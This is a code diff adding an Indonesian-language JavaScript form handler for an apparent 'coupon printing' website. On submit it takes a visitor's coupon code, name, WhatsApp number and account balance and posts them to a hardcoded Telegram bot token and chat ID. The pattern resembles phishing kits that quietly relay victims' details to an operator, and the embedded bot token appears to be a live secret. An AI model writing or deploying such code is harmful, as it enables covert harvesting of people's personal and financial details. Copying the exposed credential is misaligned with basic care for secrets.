@@ -1,0 +1,64 @@
+// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.querySelector('form'); // Ambil form pertama
+    const button = document.getElementById('kirim'); // Tombol submit
+
+    // Placeholder: Ganti dengan TOKEN bot dan chat_id Anda
+    const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Contoh: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+    const CHAT_ID = '7213790655'; // Contoh: '123456789' (untuk chat pribadi) atau '@channelusername'
+
+    // Fungsi untuk menangani submit form
+    form.addEventListener('submit', function(event) {
+        event.preventDefault(); // Cegah pengiriman default
+
+        // Ambil nilai dari input
+        const kupon = document.getElementById('kupon').value;
+        const nama = document.getElementById('nama').value;
+        const nomor = document.getElementById('nomor').value;
+        const saldo = document.getElementById('saldo').value;
+
+        // Validasi sederhana
+        if (!kupon || !nama || !nomor || !saldo) {
+            alert('Harap lengkapi semua field!');
+            return;
+        }
+
+        // Format pesan untuk Telegram
+        const message = `🔔 Data Kupoon Baru:\n\n📋 Kupon: ${kupon}\n👤 Nama: ${nama}\n📱 Nomor WA: ${nomor}\n💰 Saldo: ${saldo}\n\nDari: Website Cetak Kupoon`;
+
+        // Kirim ke API Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown' // Untuk format teks
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+            if (result.ok) {
+                alert('Data berhasil dikirim ke bot Telegram!');
+                form.reset(); // Reset form
+            } else {
+                alert('Gagal mengirim: ' + result.description);
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
+        });
+    });
+
+    // Tambahan: Vibrasi saat klik tombol (seperti di kode asli)
+    button.addEventListener('click', function() {
+        if (navigator.vibrate) {
+            navigator.vibrate(100); // Vibrasi 100ms
+        }
+    });
+});
